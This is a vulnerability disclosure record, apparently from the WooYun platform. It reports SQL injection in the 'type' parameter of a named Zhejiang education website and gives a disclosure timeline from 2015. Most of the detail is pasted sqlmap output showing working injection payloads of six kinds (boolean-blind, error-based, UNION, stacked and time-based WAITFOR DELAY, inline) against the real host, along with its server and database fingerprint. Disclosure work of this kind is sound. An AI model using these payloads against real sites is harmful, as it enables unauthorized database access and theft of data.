wybug_detail:
漏洞详情 披露状态：   									2015-03-24：	细节已通知厂商并且等待厂商处理中									2015-03-24：	厂商已经确认，细节仅向厂商公开									2015-04-03：	细节向核心白帽子及相关领域专家公开									2015-04-13：	细节向普通白帽子公开									2015-04-23：	细节向实习白帽子公开									2015-05-08：	细节向公众公开  简要描述： 后台密码是DES加密的，我没解出来 详细说明：  
http://jys.zjedu.org/jxyj.aspx?type=45&&type_=87  注入参数type=45

---Place: GETParameter: type    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=45 AND 8154=8154&&type_=87    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: type=45 AND 7586=CONVERT(INT,(SELECT CHAR(113)+CHAR(115)+CHAR(119)+CHAR(117)+CHAR(113)+(SELECT (CASE WHEN (7586=7586) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(121)+CHAR(99)+CHAR(109)+CHAR(113)))&&type_=87    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: type=-8362 UNION ALL SELECT CHAR(113)+CHAR(115)+CHAR(119)+CHAR(117)+CHAR(113)+CHAR(83)+CHAR(98)+CHAR(76)+CHAR(79)+CHAR(65)+CHAR(105)+CHAR(101)+CHAR(67)+CHAR(100)+CHAR(72)+CHAR(113)+CHAR(121)+CHAR(99)+CHAR(109)+CHAR(113)-- &&type_=87Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: type=45; WAITFOR DELAY '0:0:5'--&&type_=87    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: type=45 WAITFOR DELAY '0:0:5'--&&type_=87    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: type=(SELECT CHAR(113)+CHAR(115)+CHAR(119)+CHAR(117)+CHAR(113)+(SELECT (CASE WHEN (5571=5571) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(121)+CHAR(99)+CHAR(109)+CHAR(113))&&type_=87---web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005
